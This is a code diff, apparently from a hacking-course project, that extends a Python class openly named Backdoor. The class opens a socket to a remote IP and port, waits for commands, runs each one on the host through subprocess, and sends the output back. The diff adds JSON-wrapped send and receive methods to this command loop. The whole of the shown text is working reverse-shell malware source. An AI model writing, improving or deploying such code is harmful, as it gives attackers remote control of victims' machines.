@@ -25,16 +25,39 @@ Need to run following command in host machine to listen from incoming connection
 """
 import socket
 import subprocess
+import json
 
 
 class Backdoor:
+    """
+    Backdoor program.
+    """
+
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # (ip of destination, port opened in target)
         self.connection.connect((ip, port))
         # send data
-        connection.send("\n[+] Connection established.\n")
+        self.reliable_send("\n[+] Connection established.\n")
 
+    def reliable_send(self, data):
+        """
+        Convert data into json data and send it.
+        Use this custom send method instead of socket send method.
+
+        :param data: data that we want to send 
+        :type data: obj
+        """
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        """
+        Unwrap data into obj.
+        Use this custom receive method instead of socket recv method.
+        """
+        json_data = self.connection.recv(1024)
+        return json.loads(json_data)
 
     def execute_system_command(self, command):
         """
@@ -52,10 +75,10 @@ class Backdoor:
         Run the backdoor program.
         """
         while True:
-            command = self.connection.recv(1024)
+            command = self.reliable_receive()
             # execute command
             command_result = self.execute_system_command(command)
-            self.connection.send(command_result)
+            self.reliable_send(command_result)
         self.connection.close()
 
 
